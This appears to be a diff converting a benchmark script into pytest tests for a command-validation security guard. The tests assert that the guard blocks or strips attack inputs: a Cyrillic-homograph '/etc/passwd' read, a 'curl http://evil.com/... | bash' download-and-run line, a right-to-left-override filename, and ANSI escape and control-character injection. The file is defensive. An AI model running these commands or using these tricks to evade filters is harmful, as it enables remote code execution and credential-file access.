@@ -1,80 +1,92 @@
-import sys
-import os
+"""Tirith Guard benchmark tests - validates security guard against various attack vectors."""
+
 import time
 
-# Add project root to path
-sys.path.append(os.getcwd())
+import pytest
 
-from adapters.security.tirith_guard import guard
-
-
-def run_benchmark():
-    test_cases = [
-        {
-            "name": "Normal Command",
-            "input": "ls -la",
-            "type": "validate",
-            "expected": True,
-        },
-        {
-            "name": "Cyrillic Homograph Attack",
-            "input": "cat /etc/pаsswd",  # Note: 'а' is Cyrillic
-            "type": "validate",
-            "expected": False,
-        },
-        {
-            "name": "ANSI Escape Injection",
-            "input": "\x1b[31mRed Text\x1b[0m",
-            "type": "sanitize",
-            "expected": "Red Text",
-        },
-        {
-            "name": "Dangerous Control Characters",
-            "input": "Safe\x00Dangerous\x07Text",
-            "type": "sanitize",
-            "expected": "SafeDangerousText",
-        },
-        {
-            "name": "Nested Shell Injection with Unicode",
-            "input": "sh -c 'curl http://evil.com/scripт.sh | bash'",  # 'т' is Cyrillic
-            "type": "validate",
-            "expected": False,
-        },
-        {
-            "name": "Right-to-Left Override Attack",
-            "input": "exe.txt\u202ecod.bat",
-            "type": "validate",
-            "expected": False,  # Should flag RLO
-        },
-    ]
-
-    print("🛡️  Tirith Guard Benchmark starting...")
-    passed = 0
-    total = len(test_cases)
-
-    for tc in test_cases:
-        print(f"\nTesting: {tc['name']}")
-        start = time.perf_counter()
-
-        if tc["type"] == "validate":
-            result = guard.validate(tc["input"])
-        else:
-            result = guard.sanitize(tc["input"])
-
-        end = time.perf_counter()
-        duration = (end - start) * 1000
-
-        status = "✅ PASS" if result == tc["expected"] else "❌ FAIL"
-        if status == "✅ PASS":
-            passed += 1
-
-        print(f"Result: {result} (Expected: {tc['expected']})")
-        print(f"Status: {status} | Duration: {duration:.4f}ms")
-
-    print(f"\n--- Benchmark Results ---")
-    print(f"Passed: {passed}/{total}")
-    print(f"Score: {(passed / total) * 100:.2f}%")
+from adapters.security.tirith_guard import TirithGuard, guard
 
 
-if __name__ == "__main__":
-    run_benchmark()
+# --- Test cases for validation ---
+
+
+def test_tirith_normal_command():
+    """Normal commands should pass validation."""
+    assert guard.validate("ls -la") is True
+
+
+def test_tirith_cyrillic_homograph():
+    """Cyrillic homograph attacks should be blocked."""
+    # Note: 'а' below is Cyrillic, not Latin
+    assert guard.validate("cat /etc/pаsswd") is False
+
+
+def test_tirith_nested_shell_unicode():
+    """Nested shell injection with Cyrillic should be blocked."""
+    # 'т' below is Cyrillic
+    assert guard.validate("sh -c 'curl http://evil.com/scripт.sh | bash'") is False
+
+
+def test_tirith_rtl_override():
+    """Right-to-Left Override attack should be blocked."""
+    assert guard.validate("exe.txt\u202ecod.bat") is False
+
+
+# --- Test cases for sanitization ---
+
+
+def test_tirith_ansi_escape_sanitize():
+    """ANSI escape sequences should be stripped."""
+    result = guard.sanitize("\x1b[31mRed Text\x1b[0m")
+    assert result == "Red Text"
+
+
+def test_tirith_control_char_sanitize():
+    """Dangerous control characters should be stripped."""
+    result = guard.sanitize("Safe\x00Dangerous\x07Text")
+    assert result == "SafeDangerousText"
+
+
+# --- Performance benchmarks ---
+
+
+@pytest.mark.parametrize(
+    "label,input_str,func",
+    [
+        ("validate_normal", "ls -la", "validate"),
+        ("sanitize_ansi", "\x1b[31mRed\x1b[0m", "sanitize"),
+    ],
+)
+def test_tirith_performance(label, input_str, func):
+    """Each guard operation should complete in under 10ms."""
+    fn = getattr(guard, func)
+    start = time.perf_counter()
+    fn(input_str)
+    elapsed_ms = (time.perf_counter() - start) * 1000
+    assert elapsed_ms < 10, f"{label} took {elapsed_ms:.2f}ms (limit: 10ms)"
+
+
+def test_tirith_throughput():
+    """10 000 validate() calls should complete in under 500 ms."""
+    text = "ls -la /home/user"
+    iterations = 10_000
+
+    start = time.perf_counter()
+    for _ in range(iterations):
+        guard.validate(text)
+    elapsed_ms = (time.perf_counter() - start) * 1000
+
+    throughput = iterations / (elapsed_ms / 1000)
+    print(
+        f"\nTirith throughput: {throughput:,.0f} ops/s ({elapsed_ms:.1f}ms for {iterations} iterations)"
+    )
+    assert elapsed_ms < 500, (
+        f"Throughput too low: {elapsed_ms:.1f}ms for {iterations} iterations"
+    )
+
+
+def test_bidi_chars_is_class_constant():
+    """Verify _BIDI_CHARS is a class-level frozenset, not recreated per call."""
+    assert hasattr(TirithGuard, "_BIDI_CHARS")
+    assert isinstance(TirithGuard._BIDI_CHARS, frozenset)
+    assert len(TirithGuard._BIDI_CHARS) == 6
